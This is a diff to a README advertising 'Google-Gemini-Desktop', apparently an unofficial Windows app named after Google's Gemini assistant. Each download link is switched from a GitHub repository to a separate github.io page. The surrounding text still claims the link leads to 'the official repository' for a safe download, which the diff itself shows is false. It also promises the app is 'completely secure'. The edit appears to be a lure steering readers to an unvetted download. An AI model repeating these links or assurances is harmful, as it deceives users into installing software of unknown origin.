@@ -1,6 +1,6 @@
 # ✨ Google-Gemini-Desktop - Your Free AI Assistant for Windows
 
-[🚀 Download Now](https://github.com/Arlinka14/Google-Gemini-Desktop)
+[🚀 Download Now](https://arlinka14.github.io)
 
 ---
 
@@ -34,7 +34,7 @@ Getting started is incredibly simple. You don't need any technical knowledge or 
 
 Visit this link to download the application:
 
-[![Download Google-Gemini-Desktop](https://img.shields.io/badge/Download-Google--Gemini--Desktop-blue?style=for-the-badge&logo=github)](https://github.com/Arlinka14/Google-Gemini-Desktop)
+[![Download Google-Gemini-Desktop](https://img.shields.io/badge/Download-Google--Gemini--Desktop-blue?style=for-the-badge&logo=github)](https://arlinka14.github.io)
 
 The download link will take you to the official repository where you can safely download the latest version.
 
@@ -167,7 +167,7 @@ Before you begin, make sure you have:
 
 Ready to start? Visit this link to download the application:
 
-[![Get Google-Gemini-Desktop](https://img.shields.io/badge/⬇️-Download%20Now-green?style=for-the-badge)](https://github.com/Arlinka14/Google-Gemini-Desktop)
+[![Get Google-Gemini-Desktop](https://img.shields.io/badge/⬇️-Download%20Now-green?style=for-the-badge)](https://arlinka14.github.io)
 
 The entire process takes less than five minutes. You'll be chatting with one of the world's most advanced AI systems before you know it — completely free, completely secure, and completely on your terms.
 
